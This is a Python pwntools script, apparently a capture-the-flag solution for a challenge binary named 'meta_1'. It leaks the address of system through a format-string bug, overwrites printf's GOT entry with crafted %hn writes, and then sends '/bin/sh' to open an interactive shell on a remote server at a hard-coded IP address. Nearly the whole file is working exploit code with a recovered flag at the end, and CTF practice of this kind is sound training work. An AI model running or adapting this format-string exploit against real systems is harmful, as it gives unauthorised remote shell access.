#!/usr/bin/env python

from pwn import *

#nc 159.203.38.169 5685
#s = remote('159.203.38.169', 5685)
#s = process('./meta_1')

# for testing purposes
def write_payload(file_name, payload):
    print 'Writing payload to file : ', file_name
    f = open(file_name, 'wb')
    f.write(payload)
    f.close()

# for testing purposes
def leakStack():
    result = ""
    for i in range(1, 300):
        s = process('./meta_1')
        #s = remote('159.203.38.169', 5685)
        p = 'AAAA.%' + str(i) + '$x'
        s.recvline()
        s.recvline()
        s.recvline()
        s.sendline(p)
        s.recvline()
        result += s.recvline()
    print result

# for testing purposes, found that parameter is on 10th place in stack
def findParamPosition():
    for i in range(1, 100):
        s = remote('159.203.38.169', 5685)
        #s = process('./meta_1')
        p = 'AAAA.%' + str(i) + '$x'
        s.sendline(p)
        res = s.recvall()
        if '41414141' in res:
            print 'found 41414141 at', i,'th place'
            break
def readAddrAtAddr(addr):
    s = remote('159.203.38.169', 5685)
    #s = process('./meta_1')
    print '1', s.recvline()
    print '2', s.recvline()
    print '3', s.recvline()
    p = p32(addr) + "%p"*5 + ".%s"
    print p 
    s.sendline(p)
    print '4', s.recvline()
    result = s.recvline()
    print 'result of read addr = ', result
    result = int(result.split('.')[-1][:4][::-1].encode('hex'),16)
    print hex(result)
    return result

elf = ELF('meta_1')
system_got = elf.got['system']
printf_got = elf.got['printf']

print 'system_got = ', hex(system_got)    # system_got =  0x804a01c
print 'printf_got = ', hex(printf_got)    # printf_got =  0x804a010


#findParamPosition()    # param position = 6

system_addr = readAddrAtAddr(system_got)   # 0x80483e6

#printf_got -> system_addr   0x80483e6  ( 2052 | 33766 )
pp = p32(printf_got) + p32(printf_got + 2)
pp += '%' + str(2052 - 8) + 'x%7$hn'
pp += '%' + str(33766 - 2052) + 'x%6$hn'

#write_payload('payload', pp)

#s = process('./meta_1')
s = remote('159.203.38.169', 5685)
s.recvline()
s.recvline()
s.recvline()
s.sendline(pp)
print '1', s.recvline()   #Your answer was:
print '2', s.recvline()   # blabla
print '3', s.recvline()   # empty line
print '4', s.recvline()   # Wrong... we know...

s.sendline('/bin/sh')

s.interactive()

# FLAG{M3_Lik3z_Fr0M4tSterzz_Th3y_B3_funki3zz}



























